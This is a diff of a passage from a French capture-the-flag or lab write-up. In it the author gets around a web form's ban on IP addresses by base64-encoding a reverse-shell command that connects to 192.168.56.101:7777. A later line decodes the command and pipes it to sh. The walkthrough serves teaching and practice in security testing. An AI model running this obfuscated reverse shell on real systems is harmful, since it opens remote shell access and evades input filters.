@@ -147,10 +147,7 @@ Sur cette nouvelle page, je suis en présence d'un formulaire qui me permet d'ex
 Avec cette dernière commande, j'ai le message ```Remote connections are forbidden``` qui s'affiche.
 L'utilisation d'une adresse IP dans la commande est interdite !
 
-Je vais donc contourner ce problème en encodant ma commande avec ```base64``` :
-```console
-┌──(kali㉿kali)-[~]
-└─$ echo "sh -i >& /dev/tcp/192.168.56.101/7777 0>&1" | base64
-c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYxCg==
-```
+Je vais donc contourner ce problème en encodant ma commande avec ```base64``` : ```echo "sh -i >& /dev/tcp/192.168.56.101/7777 0>&1" | base64
+c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYxCg==```
 
+Puis je l'exécute de cette manière : ```echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYx" | base64 -d | sh```
